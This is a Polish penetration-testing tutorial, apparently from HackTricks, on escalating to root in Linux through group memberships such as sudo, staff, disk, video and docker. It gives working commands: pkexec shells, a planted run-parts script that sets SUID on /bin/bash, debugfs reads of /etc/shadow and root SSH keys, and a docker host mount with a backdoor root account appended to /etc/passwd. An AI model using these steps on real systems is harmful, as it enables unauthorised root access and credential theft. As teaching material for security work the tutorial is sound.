# Interesujące grupy — eskalacja uprawnień w Linuksie

{{#include ../../../banners/hacktricks-training.md}}

## Grupy Sudo/administracyjne

### **PE — Metoda 1**

**Czasami** polityka systemowa **/etc/sudoers** (lub dołączony do niej plik) zawiera wpisy takie jak:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Oznacza to, że każdy użytkownik pasujący do któregokolwiek z wpisów może uruchomić dowolne polecenie jako dowolny użytkownik docelowy za pośrednictwem `sudo` (z zastrzeżeniem pozostałej części polityki).<sup>[[3]](#references)</sup>

Jeśli tak jest, aby **zostać rootem, wystarczy po prostu wykonać**:

```
sudo su
```

Jeśli `sudo -l` zezwala na ograniczone wywołanie `adduser` z podaniem wyłącznie nazwy użytkownika, sprawdź, czy tworzy ono grupę podstawową o tej samej nazwie, jeśli taka jeszcze nie istnieje. Nowe konto w tej grupie może uzyskać uprawnienia, jeśli obowiązująca polityka sudoers już przyznaje je grupie `%group`; przed uznaniem tego za ścieżkę eskalacji uprawnień zweryfikuj zarówno zachowanie przy tworzeniu grupy, jak i regułę dla grupy. Utworzenie konta zmienia system, dlatego najpierw sprawdź politykę.

### PE - Method 2

Znajdź wszystkie pliki binarne suid i sprawdź, czy jest wśród nich **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Jeśli **pkexec jest plikiem binarnym SUID**, może uruchomić program jako inny użytkownik tylko wtedy, gdy polkit autoryzuje żądane działanie; sam bit SUID nie gwarantuje uprawnień root. Sprawdź zainstalowaną politykę i autoryzację sesji docelowej, zamiast zakładać, że członkostwo w grupie **sudo** lub **admin** wystarczy.<sup>[[4]](#references)[[5]](#references)</sup>

W przypadku odrębnej ścieżki [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) najpierw sprawdź, czy `pkexec` jest wykonywalnym plikiem SUID należącym do użytkownika **root**. Zainstalowany plik binarny bez tego bitu nie umożliwia lokalnej eskalacji uprawnień SUID opisanej w advisory. Numer wersji upstream to tylko wskazówka: dystrybucje mogą [backportować poprawkę do starszych wersji pakietu](https://ubuntu.com/security/CVE-2021-4034), dlatego przed uznaniem systemu za podatny sprawdź pakiet dostawcy i zastosowane mitygacje.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) dotyczy innej ścieżki polkit: wyścigu autoryzacji D-Bus, a nie luki SUID w `pkexec`. Sprawdź zainstalowany pakiet polkit dostawcy oraz to, czy dostępne uprzywilejowane działanie D-Bus może wprowadzić użyteczną zmianę; ścieżka tworzenia kont wymaga też odpowiedniej usługi, takiej jak AccountsService, a dostęp nowej grupy do sudo zależy od obowiązującej polityki sudo. Zgłoszona wersja polkit lub sama zainstalowana usługa wskazuje jedynie potencjalny problem, zwłaszcza że dostawcy mogą [backportować poprawki](https://access.redhat.com/security/cve/cve-2021-3560). Pasywna enumeracja nie powinna wywoływać wyścigu.

W dystrybucjach, które nadal korzystają ze starszego backendu Local Authority, sprawdź reguły grup za pomocą:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Nazwy odpowiednich grup i wartości domyślne różnią się w zależności od dystrybucji; grupa jest tu przydatna tylko wtedy, gdy wymienia ją lokalna polityka.<sup>[[5]](#references)</sup>

Aby **uzyskać uprawnienia root, możesz wykonać**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Jeśli spróbujesz uruchomić **pkexec** i pojawi się ten **błąd**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

W sesji SSH bez zarejestrowanego agenta uwierzytelniania `pkexec` może zwrócić ten błąd, nawet jeśli zasady w innych okolicznościach zezwalałyby na wykonanie działania; polkit opisuje `pkttyagent` jako tekstowego agenta uwierzytelniania dla sesji innych niż desktopowe. Dokładne działanie zależy od wersji i dystrybucji, dlatego sprawdź lokalne zasady i konfigurację agenta. Zgłaszane obejście dla niektórych wersji NixOS wymaga użycia **2 różnych sesji SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL odmawiający danemu kontu dostępu do `su` dotyczy tego pliku wykonywalnego, a nie każdej drogi do działania autoryzowanego przez administratora. Jeśli dane uwierzytelniające administratora zostały niezależnie ujawnione, sprawdź, czy skuteczna polityka polkit zezwala na osobne działanie, takie jak uruchomienie tymczasowej usługi systemowej przez `systemd-run`, jaką tożsamość akceptuje agent uwierzytelniania i jakiej tożsamości użyje uruchomiona usługa. [Polkit rozróżnia uwierzytelnianie jako właściciel sesji i jako administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), a [systemd-run może zażądać od menedżera systemowego uruchomienia tymczasowej usługi](https://systemd.io/CONTROL_GROUP_INTERFACE/). Sam wpis w historii, zainstalowane polecenie ani czytelny plik zasad nie potwierdzają uprawnień ani poprawności danych uwierzytelniających; pasywna analiza nie powinna wysyłać danych uwierzytelniających ani uruchamiać jednostki.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Grupa wheel

Czasami polityka sudoers może zawierać również ten wpis:

```
%wheel	ALL=(ALL:ALL) ALL
```

Oznacza to, że każdy użytkownik pasujący do wpisu może uruchomić dowolne polecenie jako dowolny użytkownik docelowy za pomocą `sudo` (z zastrzeżeniem pozostałych zasad).<sup>[[3]](#references)</sup>

Jeśli tak jest, **aby zostać rootem, wystarczy wykonać**:

```
sudo su
```

## Grupa shadow

Na systemach, których uprawnienia na to pozwalają, użytkownicy z grupy **shadow** mogą **odczytywać** **/etc/shadow**; sprawdź rzeczywisty tryb uprawnień i listy ACL na systemie docelowym:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Przeczytaj więc plik i spróbuj **scrackować kilka hashy**.

Ważna kwestia dotycząca stanu blokady podczas analizy hashy:
- Wpisy zawierające `!` lub `*` zasadniczo nie pozwalają na interaktywne logowanie hasłem.
- `!hash` oznacza, że hasło zostało zablokowane; pozostałe znaki reprezentują pole hasła sprzed blokady.
- Pole zawierające `*` nie jest prawidłowym hashem `crypt(3)` i uniemożliwia logowanie do UNIX-a hasłem; nie należy na tej podstawie wnioskować, czy hasło było wcześniej ustawione.
Jest to przydatne przy klasyfikowaniu kont, nawet jeśli bezpośrednie logowanie jest zablokowane.<sup>[[6]](#references)</sup>

## Grupa staff

**staff**: Umożliwia użytkownikom wprowadzanie lokalnych modyfikacji w systemie (`/usr/local`) bez uprawnień root (należy pamiętać, że pliki wykonywalne w `/usr/local/bin` znajdują się w zmiennej PATH każdego użytkownika i mogą „zastępować” pliki wykonywalne o tej samej nazwie w `/bin` i `/usr/bin`). Porównaj z grupą „adm”, która jest bardziej związana z monitorowaniem i bezpieczeństwem.<sup>[[2]](#references)[[7]](#references)</sup>

W konfiguracjach Debiana, w których `/usr/local/bin` znajduje się przed `/usr/bin` w `PATH` (jak w poniższych przykładach), polecenie bez pełnej ścieżki najpierw wskazuje kopię w `/usr/local/bin`; potwierdź efektywną wartość `PATH` na systemie docelowym.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Jeśli uprzywilejowany proces wyszukuje polecenie bez pełnej ścieżki w zapisywalnym `/usr/local/bin`, podmiana tego polecenia może spowodować jego wykonanie z uprawnieniami procesu; przed testowaniem potwierdź rzeczywistą ścieżkę i warunki uruchomienia.

W systemach Ubuntu `pam_motd` uruchamia podczas logowania skrypty wykonywalne za pomocą `run-parts --lsbsysinit` jako root; zadania cron również mogą używać `run-parts`, ale zależy to od dystrybucji i konfiguracji.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Przy nowym logowaniu SSH `pspy` może pomóc potwierdzić, czy ta ścieżka jest faktycznie wywoływana w systemie docelowym; może obserwować wiersze poleceń procesów bez uprawnień root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Grupa disk

Przynależność do grupy **disk** może zapewniać bezpośredni dostęp do urządzeń blokowych i często oznacza **dostęp niemal równoważny uprawnieniom roota**; Debian opisuje ją jako w większości równoważną uprawnieniom roota, ale sprawdź rzeczywiste uprawnienia do urządzeń i układ pamięci masowej na celu.<sup>[[7]](#references)</sup>

Typowe ścieżki urządzeń obejmują `/dev/sd*`, ale NVMe i inne układy pamięci masowej używają innych nazw.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` działa na systemach plików ext2/ext3/ext4; ścieżki takie jak `/root` i `/etc/shadow` powyżej wskazują pliki w otwartym systemie plików, natomiast drugi argument polecenia `dump` to ścieżka wyjściowa w natywnym systemie plików.<sup>[[8]](#references)</sup> Na przykład to polecenie wyodrębnia `/tmp/asd1.txt` z otwartego systemu plików do `/tmp/asd2.txt` w natywnym systemie plików:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Opcja `-w` otwiera system plików w trybie odczytu i zapisu, a polecenie `write` kopiuje plik natywny do otwartego systemu plików. Unikaj używania jej na zamontowanym, działającym systemie plików, ponieważ bezpośrednie zmiany mogą go uszkodzić; jeśli to możliwe, pracuj na obrazie offline.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Grupa video

Za pomocą polecenia `w` możesz sprawdzić, **kto jest zalogowany do systemu**. Wyświetli ono wynik podobny do poniższego.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Wpis **tty1** identyfikuje pierwszą wirtualną konsolę systemu Linux; sam w sobie nie dowodzi, że użytkownik fizycznie znajduje się przy maszynie, zwłaszcza w kontenerach lub innych środowiskach.<sup>[[21]](#references)</sup>

W systemach udostępniających możliwe do odczytu urządzenie framebuffer przynależność do grupy **video** może zapewniać dostęp do tego urządzenia. Interfejs framebuffer systemu Linux dokumentuje `/dev/fb0` jako możliwe do odczytu urządzenie pamięci, z którego można skopiować dane, aby wykonać zrzut ekranu; ścieżka `/sys/class/graphics/fb0/virtual_size` jest dostępna tylko wtedy, gdy obecny jest ten atrybut fbdev w sysfs, dlatego najpierw sprawdź system docelowy.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Jeśli zainstalowana wersja **GIMP** udostępnia importer danych surowych, otwórz za jego pomocą plik **`screen.raw`**; obsługa i dostępne opcje różnią się w zależności od wersji i wtyczki.<sup>[[22]](#references)</sup>

![Grupa dyskowa - Grupa wideo: Aby otworzyć surowy obraz, użyj GIMP, wybierz plik screen.raw i jako typ pliku wybierz Raw image data](<../../../images/image (463).png>)

Ustaw szerokość i wysokość obrazu zgodnie z geometrią framebuffer; wypróbuj dostępne formaty pikseli/typy obrazu, aż uzyskasz czytelny obraz.<sup>[[9]](#references)</sup>

![Grupa dyskowa - Grupa wideo: Następnie zmień szerokość i wysokość na wartości używane przez ekran, sprawdź różne typy obrazu i wybierz ten, który najlepiej wyświetla ekran](<../../../images/image (317).png>)

## Grupa root

Przynależność do grupy **root** nie nadaje UID użytkownika root, ale pliki zapisywalne przez grupę i należące do `root` mogą być interesujące, jeśli korzystają z nich uprzywilejowane usługi lub biblioteki. Zanim uznasz to za ścieżkę eskalacji uprawnień, sprawdź rzeczywiste uprawnienia pliku i sposób jego użycia.

**Sprawdź, które pliki członkowie grupy root mogą modyfikować**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Członkostwo w grupie `docker` zapewnia dostęp na poziomie roota do demona Docker w standardowych instalacjach rootful. Ponieważ bind mounts domyślnie umożliwiają zapis, użytkownik mogący kontrolować tego demona może zamontować `/` hosta w kontenerze i modyfikować pliki hosta; w praktyce daje to uprawnienia roota na hoście.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Członkostwo w grupie może być niespójne między `/etc/group`, `/etc/gshadow` a tokenem bieżącego procesu. Jeśli użytkownika nie ma w wyniku `id -nG`, ale `newgrp docker` działa, sprawdź grupę wskazaną przez `id` w nowej powłoce i zweryfikuj, czy gniazdo Docker jest faktycznie zapisywalne oraz czy obsługuje demona rootful. Sama nazwa grupy nie potwierdza kontroli nad hostem. Ogranicz czas automatycznego sprawdzania za pomocą `newgrp`, aby monit o hasło nie wstrzymał enumeracji.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Wreszcie, jeśli nie podobają Ci się żadne z wcześniejszych sugestii albo z jakiegoś powodu nie działają (firewall Docker API?), zawsze możesz spróbować **uruchomić uprzywilejowany kontener i uciec z niego**, jak wyjaśniono tutaj:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Jeśli masz uprawnienia do zapisu do docker socket, przeczytaj [**ten post o eskalacji uprawnień przez nadużycie docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

Zazwyczaj **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików logów** znajdujących się w _/var/log/_.\
Dlatego jeśli udało Ci się przejąć konto użytkownika należącego do tej grupy, zdecydowanie powinieneś **przejrzeć logi**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Te grupy mają znaczenie zależne od usług i dystrybucji. Debian opisuje grupę `backup` jako umożliwiającą delegowanie tworzenia i przywracania kopii zapasowych, `lp` jako grupę dla demonów drukarek, a `mail` jako grupę dla `/var/mail`, dlatego przed uznaniem członkostwa za ścieżkę do uzyskania uprawnień sprawdź lokalne uprawnienia.<sup>[[7]](#references)</sup>

Często stanowią one wektory **pozyskiwania poświadczeń**, a nie bezpośrednie ścieżki do roota:
- **backup**: może udostępniać archiwa zawierające konfiguracje, klucze, zrzuty baz danych lub tokeny.
- **operator**: zależny od platformy dostęp operacyjny, który może ujawnić wrażliwe dane środowiska uruchomieniowego.
- **lp**: kolejki i bufory wydruku mogą zawierać treść dokumentów.
- **mail**: bufory poczty mogą ujawniać linki do resetowania haseł, kody OTP i wewnętrzne poświadczenia.

Traktuj członkostwo w tych grupach jako istotne ryzyko ujawnienia danych i wykorzystaj ponownie użyte hasła lub tokeny do dalszego działania.

## Auth group

W OpenBSD, gdy skonfigurowano S/Key, właścicielem `/etc/skey` jest `root:auth`, a dostęp do zapisanych tam danych wymaga przynależności do grupy `auth`; dane YubiKey są przechowywane w `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Podatna konfiguracja OpenBSD 6.6 z włączonym S/Key lub YubiKey pozwalała lokalnym użytkownikom z uprawnieniami `auth` uzyskać uprawnienia roota; Qualys opisuje wymagania wstępne i łańcuch exploitacji, a podlinkowany PoC je implementuje.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Uwierzytelnianie pkexec/pkttyagent bez sesji GUI (zgłoszenie NixOS nr 18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Grupy systemowe — Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — strony podręcznika Debiana](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — podręcznik referencyjny polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — podręcznik referencyjny polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Podręcznik zabezpieczania Debiana](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — strona podręcznika Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Urządzenie bufora ramki — dokumentacja jądra Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — strony podręcznika Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — strony podręcznika Debiana](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — nieuprzywilejowane śledzenie procesów Linux](https://github.com/DominicBreuker/pspy)
- [13] [Bezpieczeństwo Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Zarządzanie Docker jako użytkownik inny niż root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Uruchamianie kontenerów — dokumentacja Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — strony podręcznika OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — strony podręcznika OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Podatności uwierzytelniania w OpenBSD — ostrzeżenie bezpieczeństwa Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — lokalny exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Urządzenia przydzielone w Linux (wersja 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importowanie i eksportowanie obrazów — dokumentacja GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
